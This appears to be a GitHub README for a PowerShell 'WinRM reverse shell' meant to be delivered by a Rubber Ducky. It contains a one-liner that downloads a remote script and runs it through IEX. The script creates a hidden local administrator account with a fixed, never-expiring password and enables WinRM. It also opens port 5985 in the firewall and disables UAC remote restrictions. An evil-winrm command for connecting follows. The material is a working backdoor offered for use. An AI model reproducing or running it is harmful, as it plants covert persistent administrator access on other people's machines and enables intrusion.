# WinRM-Reverse-Shell

# Own Pass And Name
Go to `WinRM.ps1` and edit 
+ $Username = "`TO YOUR OWN`"
And for the pass edit
+ $Password = ConvertTo-SecureString "`TO YOUR OWN`" -AsPlainText -Force

# Powershell One liner with administrator permissions
`IEX (IWR "https://raw.githubusercontent.com/VBV11/WinRM-Reverse-Shell/main/WinRM.ps1")`
# How to get the shell using Evil-WinRM
Use this command 
`evil-winrm -i YOUR.IP.ADDRES.LOL -u Admin -p Password1`
# ![Screenshot_2024-02-25_13-40-13 (1)](https://github.com/VBV11/WinRM-Reverse-Shell/assets/104235290/446782ec-8fcf-46ac-adf1-10f54711bf73)

# Rubber Ducky payload


# Script into pieces
## Create a new local user account
$Username = "`Admin`"
$Password = ConvertTo-SecureString "`Password1`" -AsPlainText -Force
New-LocalUser -Name $Username -Password $Password -PasswordNeverExpires

# Author
This script was authored by VBV11.

## Add the newly created user to the local Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $Username

## Enable Windows Remote Management (WinRM)
Enable-PSRemoting -Force

## Add a firewall rule to allow WinRM traffic
New-NetFirewallRule -DisplayName "Windows Remote Management for RD" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow

## Disable UAC remote restrictions
+ Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force
+ New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "Admin" -Value 0 -PropertyType DWORD -Force

## Exit PowerShell session
Exit

# Credits
### credits TW-D for inspiring me to create this powershell script
